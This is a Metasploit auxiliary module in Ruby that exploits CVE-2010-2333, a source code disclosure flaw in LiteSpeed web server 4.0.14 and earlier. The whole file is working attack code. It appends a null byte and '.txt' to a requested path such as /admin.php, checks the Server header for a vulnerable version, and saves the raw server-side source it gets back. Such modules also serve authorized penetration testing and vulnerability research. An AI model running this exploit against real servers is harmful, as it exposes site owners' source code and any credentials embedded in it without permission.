##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'LiteSpeed Source Code Disclosure/Download',
      'Description'    => %q{
          This module exploits a source code disclosure/download vulnerability in
        versions 4.0.14 and prior of LiteSpeed.
      },
      'References'     =>
        [
          [ 'CVE', '2010-2333' ],
          [ 'OSVDB', '65476' ],
          [ 'BID', '40815' ],
          [ 'EDB', '13850' ]
        ],
      'Author'         =>
        [
          'Kingcope',  # initial disclosure
          'xanda'      # Metasploit module
        ],
      'License'        =>  MSF_LICENSE)

    register_options(
      [
        OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
        OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
      ], self.class)
  end

  def target_url
    uri = normalize_uri(datastore['URI'])
    "http://#{vhost}:#{rport}#{datastore['URI']}"
  end

  def run_host(ip)
    uri = normalize_uri(datastore['URI'])
    path_save = datastore['PATH_SAVE']

    vuln_versions = [
      "LiteSpeed"
    ]

    nullbytetxt = "\x00.txt"

    begin
      res = send_request_raw({
        'method'  => 'GET',
        'uri'     => "#{uri}#{nullbytetxt}",
      }, 25)

      if res.nil?
        print_error("#{target_url} - Connection timed out")
        return
      end

      version = res.headers['Server']

      if vuln_versions.include?(version)
        print_good("#{target_url} - LiteSpeed - Vulnerable version: #{version}")

        if (res and res.code == 200)

          print_good("#{target_url} - LiteSpeed - Getting the source of page #{uri}")
          p = store_loot("litespeed.source", "text/plain", rhost, res.body, path_save)
          print_status("#{target_url} - LiteSpeed - File successfully saved: #{p}")

        else
          print_error("http://#{vhost}:#{rport} - LiteSpeed - Unrecognized #{res.code} response")
          return

        end

      else
        if version =~ /LiteSpeed/
          print_error("#{target_url} - LiteSpeed - Cannot exploit: the remote server is not vulnerable - Version #{version}")
        else
          print_error("#{target_url} - LiteSpeed - Cannot exploit: the remote server is not LiteSpeed")
        end
        return

      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end

end
